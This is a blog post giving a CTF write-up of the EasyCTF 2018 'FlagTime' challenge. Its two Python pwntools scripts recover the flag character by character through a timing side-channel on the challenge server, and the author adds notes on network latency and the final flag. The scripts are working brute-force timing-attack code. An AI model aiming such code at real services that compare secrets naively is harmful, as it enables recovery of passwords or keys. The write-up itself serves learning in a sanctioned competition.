---
layout: post
title: EasyCTF'18 - FlagTime writeup
date: 2018-02-24
categories: ['writeup']
---
## Description
> This problem is so easy, it can be solved in a matter of seconds. Connect to _`c1.easyctf.com:12482`_.

<div class="divider"></div>
## Thought process 

So the moment I read the title and description I knew it was something like a [Time-Based Blind SQL Injection](http://www.sqlinjection.net/time-based/){:target="_blank"}  
<br/>
I experimented with different values to see if I could find a pattern ...

* When the character is wrong, the time taken for the reply is short
![wrong](/assets/images/flagtime-1.gif)

* A correct character resulted in a slightly longer delay in the reply (2s)
![right](/assets/images/flagtime-2.gif)

* To test this theory, I tested the first part of the flag   
 *(which is already known as the standard flag format)*
![easyctf{](/assets/images/flagtime-3.gif)
**<u>This took a total of 6 seconds, ~1 second for each correct character</u>**

<div class="divider"></div>
## Scripting time
 I wrote a script to brute force the flag based on a known characterlist:

``` python
#!/usr/bin/python
from pwn import *

#send and receive response
def send_msg(msg):
	conn = remote("c1.easyctf.com",12482)
        conn.recv() #"enter the flag:"
        conn.sendline(msg)
        data = conn.recvuntil('\n')
        if not data.rstrip() == 'no':
		print(data)
		exit()

#returns the time taken for a particular string
def getTime(s):
	sum = 0
	for t in range(3):
		start = time.time()
		send_msg(s)
		diff = time.time() - start
		sum += diff
	sum = sum / 3
	return sum

#easyctf{e@o%
flag = "easyctf{e@o%Kx3b5"   #the flag is built by adding the "winner" of each round
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!@#$%^&*_-=+"
while True:
	
	buff = []

	#pick a new character to try
	for c in chars:
		timeDiff = getTime(flag+c)
		buff.append(timeDiff)

	#get the max of all times
	winner = max(buff)
	i = buff.index(winner)

	#add to flag
	flag += chars[i]
	print ">",flag
		
```
<div class="divider"></div>
### Ups and Downs of life and hacking I suppose :signal_strength:
_Unfortunately the script was not performing as I expected ..._ 

Due to this challenge being hosted in the United States, the script's accuracy was largely affected by **<u>the  fluctuation in RTT</u>** (Round Trip Time).

I left the script to run while working on other challenges and when I checked an hour later I got `easyctf{e@o%Kx3b5` -- basically gibberish :confused:   
  
It breaks because the script only knows how to pick the character which took the longest time. I tried to compensate for the fluctations by taking the average of 3 runs which wasted half a day and didn't help at all.

![rip](/assets/images/flagtime-4.gif)

  
<div class="divider"></div>
### Workaround
I heard others mentioning running their script from a server they rented from _Amazon Web Services_ **[:us: region of course]** so I thought I could do the same, but then I remembered I ran out of free Digital Ocean :ocean: credits and I also didn't want to spend my AWS credits on a challenge like this, so I left the challenge on hold until further notice ...  

|||
| ![img](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0MaZsf1E1pkkKMymkvbgEFykdyOpqaSFiKdQWfcAAC8ToLwxR) | After a good night's rest, it suddenly came to me that EasyCTF did provide their own **<u>shell server</u>** that players could SSH into! Why didn't I think of that sooner ? I revised my current script into a faster version and stuck it into the EasyCTF shell server. |  
  
<br/>  
I was pleasantly surprised to find that their shell server already had the **`pwn`** module pre-installed :hammer_and_wrench: 
   
Setting it up on my machine was quite painful but I did learn that   
`sudo -H pip install --upgrade <package>` solves pretty much everything ~

```python
#!/usr/bin/python
from pwn import *

#send and receive response
def send_msg(msg):
	conn = remote("c1.easyctf.com",12482)
        conn.recv() #"enter the flag:"
        conn.sendline(msg)
        data = conn.recvuntil('\n')
        if not data.rstrip() == 'no':
		print(data)
		exit()

#returns the time taken for a particular string
def getTime(s):
	start = time.time()
	send_msg(s)
	diff = time.time() - start
	return diff

flag = ""  #easyctf{ezx  (not sure if x or _ they seem close)
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!@$_"

while True:
	
	max = 0
	maxChar = None

	#pick a new character to try
	for c in chars:
		timeDiff = getTime(flag+c)
		print flag+c,"->",timeDiff
		if timeDiff > max:
			maxChar = c
			max = timeDiff

	#add to flag
	
	flag += maxChar
	print "====>",flag
```
It still wasn't as fast as I'd like, as the time delay in correct characters increases for each character, it became increasingly difficult to bruteforce.   
<br/>   
 
Based on the length of the characterlist I used : 
* Brute-forcing the first character (0.5 seconds for each reply)  
  would need <u>38 seconds</u> for 1 whole round  
    
* Brute-forcing the 10th character (10 seconds for each reply)  
  would need **<u>12 minutes</u>** for 1 whole round :moyai:  
 
___

<br/>
## Endgame   
So my strategy was to let the script brute force the flag whilst I did trial and error beside it at the same time
![many](/assets/images/flagtime-5.jpg)

Once parts of the flag were uncovered, the rest of the *word* would become trivially guessable **----**  the below example shows variations of *"timing"*  
  
eg. `easyctf{ez_t1m` **->** `easyctf{ez_timing` / `easyctf{ez_t1m1ng`  

In the end the flag was **`easyctf{ez_t1m1ng_4ttack!}`** :checkered_flag:
<div class="divider"></div>
## Things I learnt from this challenge
* How to setup and use the _pwn_ library (for connecting to ports/sockets) 
  
* This type of attack is called **<u>timing attack</u>**  :clock8:
  
* The effect of physical distance between networks that can affect results significantly 


Overall I'm pretty proud that out of 1000-over teams I was one of the first _120_ to solve this challenge, although its a Miscallaneous challenge I definitely got a lot out of it ! 
